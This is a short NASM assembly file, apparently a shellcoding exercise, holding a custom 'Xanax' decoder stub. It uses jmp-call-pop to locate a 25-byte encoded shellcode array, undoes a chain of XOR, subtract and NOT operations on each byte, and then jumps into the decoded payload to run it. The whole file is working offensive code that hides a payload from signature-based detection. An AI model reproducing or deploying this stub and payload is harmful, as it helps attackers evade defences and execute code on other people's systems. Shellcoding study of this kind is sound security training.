; Filename: xanax-decoder.nasm
; Website:  www.suls.co.uk
;
; Purpose: xanx decoder stub in assembly

global _start			

section .text
_start:
    jmp short call_shellcode

decoder:
	pop esi ; pop shellcode address to esi 
	xor ecx, ecx ; Clear ecx 
	mov cl, 25 ; store counter of number of bytes
	
decode: 
    ; Xanax Decoder (NB:reverse order of our python encoder)
	xor byte [esi], 0x35
    sub byte [esi], 0x08
    not byte [esi]
    sub byte [esi], 0x01
	xor byte [esi], 0xaa
    ; Increment counter 
    inc esi
    ;loop if not done  
	loop decode 
    ; Otherwise call our decoded shellcode 
	jmp short EncodedShellcode

call_shellcode:

	call decoder
	EncodedShellcode: db 0x5e,0xa9,0x39,0x71,0xb4,0xb4,0x18,0x71,0x71,0xb4,0x0b,0x76,0x77,0xd6,0x88,0x39,0xd6,0x8b,0x38,0xd6,0x8e,0xd9,0x50,0xaa,0xe9




